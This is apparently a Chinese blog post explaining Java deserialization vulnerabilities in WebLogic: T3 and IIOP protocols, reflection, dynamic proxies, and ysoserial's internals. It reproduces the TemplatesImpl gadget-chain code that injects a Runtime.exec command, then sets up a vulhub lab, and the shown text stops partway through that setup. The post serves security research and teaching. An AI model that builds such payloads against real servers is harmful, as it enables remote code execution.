@@ -1,0 +1,2032 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>WebLogic反序列化漏洞研究 | Tyaoo's Blog</title><meta name="keywords" content="WebLogic"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="搜集和分析关于WebLogic的反序列化漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic反序列化漏洞研究">
+<meta property="og:url" content="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="搜集和分析关于WebLogic的反序列化漏洞">
+<meta property="og:locale">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2021-02-02T14:33:50.000Z">
+<meta property="article:modified_time" content="2022-02-15T09:36:15.032Z">
+<meta property="article:author" content="Tyaoo">
+<meta property="article:tag" content="WebLogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WebLogic反序列化漏洞研究',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-15 17:36:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WebLogic反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-02T14:33:50.000Z" title="Created 2021-02-02 22:33:50">2021-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-15T09:36:15.032Z" title="Updated 2022-02-15 17:36:15">2022-02-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WebLogic反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>搜集和分析关于WebLogic的反序列化漏洞</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>序列化数据特征</strong></p>
+<p>对weblogic在7001端口的T3协议进行抓包，可以发现java序列化之后数据的Magic头<code>ac ed 00 05</code>，其编码后是<code>rO0ABQ==</code></p>
+<p><strong>使用场景</strong></p>
+<ol>
+<li>http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等</li>
+<li>ServletsHTTP，Sockets，Session管理器包含的协议，包括JMX，RMI，JMS，JNDI等</li>
+<li>xmlXstream，XMLDecoder等</li>
+<li>json，包括Jackson，fastjson等</li>
+</ol>
+<p><strong>反序列化攻击时序图</strong></p>
+<p>Java应用的反序列化流程</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105221529bd01a07b7dcb57cfbb91.png" alt="image-20210522152846833" style="zoom: 67%;" />
+
+<p><strong>反序列化流程图</strong></p>
+<p>WebLogic进行反序列化的执行流程图</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127195915def76095470f1ec5fe.png" alt="img"></p>
+<blockquote>
+<p>实现了<code>External</code>接口的对象会调用<code>readExternal()</code>函数，实现了<code>Serialize</code>接口的对象会调用<code>readObject()</code>函数</p>
+<p>使用<code>Proxy</code>类封装的对象会调用<code>readProxyClass()</code>函数，否则会调用<code>readClass()</code>函数</p>
+<p>如果对象中存在<code>readResolve()</code>函数会自动执行它</p>
+<p>weblogic的黑名单检查放置在<code>resolveProxyClass()</code>和<code>resolveClass()</code>函数中，函数为<code>ClassFilter.isBlackListed()</code></p>
+</blockquote>
+<p><strong>漏洞分类</strong></p>
+<p>WebLogic反序列化高危漏洞主要分为java反序列化和xml反序列化，其中java发序列化可通过T3协议和IIOP协议触发，下面的漏洞分析也是根据这两大方面分隔展示</p>
+<h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>反射机制</strong></p>
+<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
+<p><strong>RMI和JRMP协议</strong></p>
+<p>RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。</p>
+<p><strong>CORBA</strong></p>
+<p>CORBA（Common Object Request Broker Architecture，公共对象请求代理体系结构）是跨语言（C ++、Java等）的通信体系结构，通常在 IIOP 协议中使用。</p>
+<p><strong>GIOP协议</strong></p>
+<p>GIOP（General Inter-ORB Protocol，通用对象请求代理间通信协议）是分布式计算领域的一种抽象协议，负责ORB的通信。</p>
+<p><strong>IIOP协议</strong></p>
+<p>IIOP（Internet Inter-ORB Protocol，互联网内部对象请求代理协议），用来在CORBA对象请求代理之间交流的协议，实现Java和其他语言的CORBA的互操作。</p>
+<p><strong>RMI-IIOP协议</strong></p>
+<p>兼容了RMI和IIOP的实现，解决RMI和CORBA/IIOP无法同时使用的技术方案。</p>
+<p><strong>T3协议</strong></p>
+<p>WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。</p>
+<p><strong>IDL</strong></p>
+<p>IDL（Interface Definition Language，接口定义语言）主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p>
+<p><strong>JAVA IDL</strong></p>
+<p>JAVA IDL是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于CORBA，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html">文档</a>。</p>
+<h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制</p>
+<p><strong>获取class</strong></p>
+<pre><code class="java">// 函数调用
+Class class1 = testClass.getClass();
+// class属性,最安全,性能最好,不会自动初始化该Class对象
+Class class2 = testClass.class;
+// 动态加载,最常用,className需要是类的全限定名,会自动初始化该Class对象
+Class class3 = Class.forName(&quot;&#123;package.className&#125;&quot;);
+// 动态加载
+Class class4 = ClassLoader.loadClass(&quot;&#123;package.className&#125;&quot;);</code></pre>
+<blockquote>
+<p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code></p>
+</blockquote>
+<p><strong>获取constructor</strong></p>
+<pre><code class="java">// getDeclaredConstructor会返回所有有权限的构造器
+Constructor constructor1 = class1.getDeclaredConstructor(&#123;arg1&#125;.class, ...);
+Constructor constructors1 = class1.getDeclaredConstructors(&#123;arg1&#125;.class, ...);
+// getConstructor只返回权限是public的构造器
+Constructor constructor2 = class1.getConstructor(&#123;arg1&#125;.class, ...);
+Constructor constructors2 = class1.getConstructors(&#123;arg1&#125;.class, ...);</code></pre>
+<p><strong>创建instance</strong></p>
+<pre><code class="java">// 使用构造器进行实例化
+Object instance1 = constructor1.newInstance();
+// 当构造函数无参时,可直接使用class进行实例化
+Object instance1 = class1.newInstance();</code></pre>
+<p><strong>获取method</strong></p>
+<pre><code class="java">// getDeclaredMethod会返回到当前类的所有成员方法
+Method method1 = class1.getDeclaredMethod(&quot;&#123;methodName&#125;&quot;, &#123;arg1&#125;.class, ...);
+Method[] methods1 = class1.getDeclaredMethods();
+// getMethod只返回当前类和父类的权限是public的方法
+Method method2 = class1.getMethod(&quot;&#123;methodName&#125;&quot;, &#123;arg1&#125;.class, ...);
+Method[] methods2 = class1.getMethods();</code></pre>
+<p><strong>调用method</strong></p>
+<pre><code class="java">Process process1 = (Process) method1.invoke(instance1,&quot;&#123;arg0&#125;&quot;); // arg0是调用函数的参数,可选选项</code></pre>
+<p><strong>获取method结果</strong></p>
+<pre><code class="java">InputStream in = process1.getInputStream();</code></pre>
+<p><strong>输出method结果</strong></p>
+<pre><code class="java">System.out.println(IOUtils.toString(in,&quot;UTF-8&quot;));</code></pre>
+<p><strong>设置public属性</strong></p>
+<pre><code class="java">constructor1.setAccessible(true);
+method1.setAccessible(true);</code></pre>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>Java动态机制涉及一个接口和一个类，分别是<code>InvocationHandler</code>接口和<code>Proxy</code>类</p>
+<p><strong>InvocationHandler</strong></p>
+<p><code>InvocationHandler</code>接口是<code>proxy</code>代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序，在代理实例调用方法时，方法调用被编码并调度到调用处理程序的<code>invoke</code>方法</p>
+<p><strong>Proxy</strong></p>
+<p><code>Proxy</code>类就是用来创建一个代理对象的类，它提供了很多方法，但是我们最常用的是<code>newProxyInstance</code>方法</p>
+<pre><code class="java">public static Object newProxyInstance(
+    ClassLoader loader,  // 代理类的classloader
+    Class&lt;?&gt;[] interfaces,  // 代理类的interface数组
+    InvocationHandler h // 包含invoke函数实现的InvocationHandler
+)</code></pre>
+<p><strong>样例</strong></p>
+<pre><code class="java">import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+
+interface Hello &#123;
+    void morning(String name);
+&#125;
+
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        InvocationHandler handler = new InvocationHandler() &#123;
+            @Override
+            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
+                System.out.println(method);
+                if (method.getName().equals(&quot;morning&quot;)) &#123;
+                    System.out.println(&quot;Good morning, &quot; + args[0]);
+                &#125;
+                return null;
+            &#125;
+        &#125;;
+        Hello hello = (Hello) Proxy.newProxyInstance(
+            Hello.class.getClassLoader(), // 传入ClassLoader
+            new Class[] &#123; Hello.class &#125;, // 传入要实现的接口
+            handler); // 传入处理调用方法的InvocationHandler
+        hello.morning(&quot;Bob&quot;);
+    &#125;
+&#125;</code></pre>
+<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+</blockquote>
+<p>ysoerial是一款专门用于生成Java反序列化Payload的工具</p>
+<p>我们可以在<code>src/main/java/ysoserial/payloads/</code>文件夹中自定义自己的Payload，不过在自定义之前我们需要了解<code>src/main/java/ysoserial/payloads/util</code>文件中工具类的使用</p>
+<p><strong>ClassFiles.java</strong></p>
+<pre><code class="java">// 将类转化为文件名
+String classAsFile(final Class&lt;?&gt; clazz, boolean suffix)
+// 将类转化为字节码
+byte[] classAsBytes(final Class&lt;?&gt; clazz)</code></pre>
+<p><strong>Gadgets.java</strong></p>
+<pre><code class="java">// 创建一个memberValues为map的AnnotationInvocationHandler接口
+InvocationHandler createMemoizedInvocationHandler ( final Map&lt;String, Object&gt; map )
+// 创建iface类对应的Proxy实例
+&lt;T&gt; T createProxy ( final InvocationHandler ih, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces )
+// 创建实现了AnnotationInvocationHandler接口的iface类对应的Proxy实例
+&lt;T&gt; T createMemoitizedProxy ( final Map&lt;String, Object&gt; map, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces )
+// 创建一个HashMap实例并加入&#123;key:val&#125;元素
+Map&lt;String, Object&gt; createMap ( final String key, final Object val )
+// 使用TemplatesImpl的Gadget构造执行command的对象
+Object createTemplatesImpl ( final String command )
+// 创建一个table成员为[&#123;v1:v1&#125;,&#123;v2:v2&#125;]的HashMap实例
+HashMap makeMap ( Object v1, Object v2 )</code></pre>
+<p><strong>JavaVersion.java</strong></p>
+<pre><code class="java">// 获取本地Java版本
+JavaVersion getLocalVersion()</code></pre>
+<p><strong>PayloadRunner.java</strong></p>
+<pre><code class="java">// 运行Payload
+void run(final Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, final String[] args)</code></pre>
+<p><strong>Reflections.java</strong></p>
+<pre><code class="java">// 获取对象成员
+Field getField(final Class&lt;?&gt; clazz, final String fieldName)
+// 设置对象成员
+void setFieldValue(final Object obj, final String fieldName, final Object value)
+// 获取对象成员的值
+Object getFieldValue(final Object obj, final String fieldName)
+// 获取第一个构造器
+Constructor&lt;?&gt; getFirstCtor(final String name)
+// 使用构造器进行实例化
+&lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</code></pre>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a></p>
+</blockquote>
+<p>在上面<code>Gadgets.java</code>中的<code>createTemplatesImpl()</code>函数中，我们提到了ysoserial是使用<code>TemplatesImpl</code>的Gadget来构造恶意数据的，下面我们详细介绍一下其原理</p>
+<h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有Class中动态修改和插入Java static代码</p>
+<p><strong>样例</strong></p>
+<pre><code class="java">public class Cat &#123;&#125;
+
+@Test
+public void test() throws Exception &#123;
+  ClassPool pool = ClassPool.getDefault();
+  CtClass cc = pool.get(Cat.class.getName());
+  String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;
+  // 创建static代码块，并插入代码
+  cc.makeClassInitializer().insertBefore(cmd);
+  String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+  cc.setName(randomClassName);
+  // 写入.class 文件
+  cc.writeFile();
+&#125;</code></pre>
+<blockquote>
+<p>这里有一个重要的知识点是<code>defineClass()</code>函数并不会触发上面的static代码，但是使用<code>newInstence()</code>函数进行实例化的时候可以触发</p>
+</blockquote>
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>首先我们找到<code>TemplatesImpl</code>类的入口点<code>getOutputProperties()</code>函数</p>
+<pre><code class="java">public synchronized Properties getOutputProperties() &#123;
+    try &#123;
+        return newTransformer().getOutputProperties(); // 1 跟进newTransformer()函数
+    &#125;
+    catch (TransformerConfigurationException e) &#123;
+        return null;
+    &#125;
+&#125;</code></pre>
+<pre><code class="java">public synchronized Transformer newTransformer()
+    throws TransformerConfigurationException
+&#123;
+    TransformerImpl transformer;
+
+    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+        _indentNumber, _tfactory); // 2 实例化了TransformerImpl,跟进getTransletInstance()函数
+
+    if (_uriResolver != null) &#123;
+        transformer.setURIResolver(_uriResolver);
+    &#125;
+
+    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;
+        transformer.setSecureProcessing(true);
+    &#125;
+    return transformer;
+&#125;</code></pre>
+<pre><code class="java">private Translet getTransletInstance()
+    throws TransformerConfigurationException &#123;
+    try &#123;
+        if (_name == null) return null; // 3 令_name为非空往下进行
+
+        if (_class == null) defineTransletClasses(); // 4 令_class为空,跟进defineTransletClasses()函数
+
+        // The translet needs to keep a reference to all its auxiliary
+        // class to prevent the GC from collecting them
+        AbstractTranslet translet = (AbstractTranslet)
+                _class[_transletIndex].getConstructor().newInstance(); // 8 使用newInstance()触发static代码,至此代码利用完成
+        translet.postInitialization();
+        translet.setTemplates(this);
+        translet.setOverrideDefaultParser(_overrideDefaultParser);
+        translet.setAllowedProtocols(_accessExternalStylesheet);
+        if (_auxClasses != null) &#123;
+            translet.setAuxiliaryClasses(_auxClasses);
+        &#125;
+
+        return translet;
+    &#125;
+    catch (InstantiationException | IllegalAccessException |
+            NoSuchMethodException | InvocationTargetException e) &#123;
+        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+        throw new TransformerConfigurationException(err.toString(), e);
+    &#125;
+&#125;</code></pre>
+<pre><code class="java">private void defineTransletClasses()
+    throws TransformerConfigurationException &#123;
+
+    if (_bytecodes == null) &#123;
+        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+        throw new TransformerConfigurationException(err.toString());
+    &#125;
+
+    TransletClassLoader loader = (TransletClassLoader)
+        AccessController.doPrivileged(new PrivilegedAction() &#123;
+            public Object run() &#123;
+                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); // 5 确保_tfactory成员具有getExternalExtensionsMap()函数,即需是一个TransformerFactoryImpl类
+            &#125;
+        &#125;);
+
+    try &#123;
+        final int classCount = _bytecodes.length;
+        _class = new Class[classCount];
+
+        if (classCount &gt; 1) &#123;
+            _auxClasses = new HashMap&lt;&gt;();
+        &#125;
+
+        for (int i = 0; i &lt; classCount; i++) &#123;
+            _class[i] = loader.defineClass(_bytecodes[i]); // 6 使用了loader.defineClass()加载类字节码,但是还缺少static代码的触发条件
+            final Class superClass = _class[i].getSuperclass();
+
+            // Check if this is the main class
+            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; // 7 令superClass为ABSTRACT_TRANSLET,即父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet,使_transletIndex更新
+                _transletIndex = i; 
+            &#125;
+            else &#123;
+                _auxClasses.put(_class[i].getName(), _class[i]);
+            &#125;
+        &#125;
+
+        if (_transletIndex &lt; 0) &#123;
+            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+    &#125;
+    catch (ClassFormatError e) &#123;
+        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
+        throw new TransformerConfigurationException(err.toString());
+    &#125;
+    catch (LinkageError e) &#123;
+        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+        throw new TransformerConfigurationException(err.toString());
+    &#125;
+&#125;</code></pre>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>我们看一下最终的payload实现</p>
+<pre><code class="java">public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123;
+
+    private static final long serialVersionUID = -5971610431559700674L;
+
+    public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException &#123;&#125;
+
+    @Override
+    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException &#123;&#125;
+&#125;
+
+// required to make TemplatesImpl happy
+public static class Foo implements Serializable &#123;
+
+    private static final long serialVersionUID = 8207363842866235160L;
+&#125;
+
+public static Object createTemplatesImpl ( final String command ) throws Exception &#123;
+    if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) &#123;
+        // 引入了三个必要类
+        return createTemplatesImpl(
+            command,
+            Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),
+            Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),
+            Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));
+    &#125;
+
+    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+&#125;
+
+public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )
+        throws Exception &#123;
+    final T templates = tplClass.newInstance();
+
+    // 将cmd写入到StubTransletPayload类的静态代码中
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+    pool.insertClassPath(new ClassClassPath(abstTranslet));
+    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+    String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
+        command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
+        &quot;\&quot;);&quot;;
+    clazz.makeClassInitializer().insertAfter(cmd);
+    // 为重复利用采用随机命名
+    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
+    // 传入父类类型,对应调用链第7个地方,但是_transletIndex默认为0,如果我们把payload直接放在第1位是不会有影响的
+    CtClass superC = pool.get(abstTranslet.getName());
+    clazz.setSuperclass(superC);
+
+    // 传入payload的字节码,至于这里为什么要引入一个Foo类我也不太清楚,去掉是不会有影响的
+    final byte[] classBytes = clazz.toBytecode();
+    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;
+        classBytes, ClassFiles.classAsBytes(Foo.class)
+    &#125;);
+
+    // 对应调用链第3个地方
+    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
+    // 对应调用链第5个地方,但是其实_tfactory是被transient修饰的,是不参与反序列化的,它在readObject是会进行重构的,删除无影响
+    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
+    return templates;
+&#125;</code></pre>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebLogic环境搭建复杂，一般使用docker，可参考此<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">博客</a></p>
+<h3 id="weblogic-10-3-6-0"><a href="#weblogic-10-3-6-0" class="headerlink" title="weblogic: 10.3.6.0"></a>weblogic: 10.3.6.0</h3><blockquote>
+<p>参考<a href="vulhub/weblogic版本">vulhub/weblogic版本</a></p>
+</blockquote>
+<ol>
+<li><p>创建docker-compose.yml</p>
+<pre><code class="yml">version: &#39;2&#39;
+services:
+    weblogic:
+        image: vulhub/weblogic
+        environment:
+            debugFlag: &quot;true&quot;
+        ports:
+            - &quot;7001:7001&quot;
+            - &quot;8453:8453&quot;</code></pre>
+</li>
+<li><p>运行<code>docker-compose up -d</code></p>
+</li>
+<li><p>把weblogic的源码和jdk包拷出来</p>
+<blockquote>
+<p>要是源码太多了，就只复制wlserver出来就好</p>
+</blockquote>
+<pre><code class="shell">docker cp [weblogic id]:/root ./root</code></pre>
+</li>
+<li><p>IDEA打开<code>/root/Oracle/Middleware/wlserver_10.3/</code>目录</p>
+</li>
+<li><p>把Middleware目录下所有的*.jar包都放在一个test的文件夹里（同名.jar会有影响，比如CVE-2020-14645）</p>
+<pre><code class="shell">mkdir test &amp;&amp; find ./ -name &#39;*.jar&#39; -exec cp &#123;&#125; ./test/ \; 2&gt;/dev/null</code></pre>
+</li>
+<li><p>然后在<code>Project Settings-&gt;Libraries</code>下添加test目录</p>
+</li>
+<li><p>前往<code>Project Settings-&gt;Project</code>，选用WebLogic自带的jdk1.6</p>
+</li>
+<li><p>创建remote server，配置远程调试的IP（localhost）和端口（8453），点击debug，出现以下信息即为成功</p>
+<pre><code class="shell">Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39;</code></pre>
+</li>
+<li><p>（附）抓取流量</p>
